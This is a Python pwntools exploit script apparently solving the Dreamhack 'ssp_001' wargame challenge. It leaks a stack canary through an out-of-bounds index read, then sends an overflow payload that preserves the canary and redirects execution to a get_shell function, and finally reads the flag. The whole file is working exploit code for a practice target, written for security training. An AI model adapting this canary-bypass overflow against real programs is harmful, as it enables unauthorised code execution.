from pwn import *

e = ELF('./ssp_001')
#p = process('./ssp_001')
p = remote('host3.dreamhack.games', 12658)

p.sendlineafter(b'> ', b'F')

PAYLOAD1 = b'\x41' * 0x40

p.sendlineafter(b"box input : ", PAYLOAD1)

CANARY = ''

for i in range(3, -1, -1):
    p.sendlineafter(b'> ', b'P')
    p.sendlineafter(b"Element index : ", str(0x80 + i))
    p.recvuntil(b' is : ')
    CANARY += p.recvuntil(b'\n', drop=True).decode('utf-8')

CANARY = int(CANARY, 16)
GET_SHELL_ADDR = e.symbols["get_shell"]

print('[+] CANARY VALUE : ' + hex(CANARY))
print('[+] get_shell FUNC ADDR : ' + hex(GET_SHELL_ADDR))

PAYLOAD2 = b'\x41' * 0x40 + p32(CANARY) + b'\x42' * 0x8 + p32(GET_SHELL_ADDR)

p.sendlineafter(b'>', b'E')
p.sendlineafter(b'Name Size : ', str(len(PAYLOAD2)))
p.sendlineafter(b'Name : ', PAYLOAD2)

p.sendline('cat flag')
print('[+] FLAG : ', p.recvuntil(b'}').decode('utf-8'))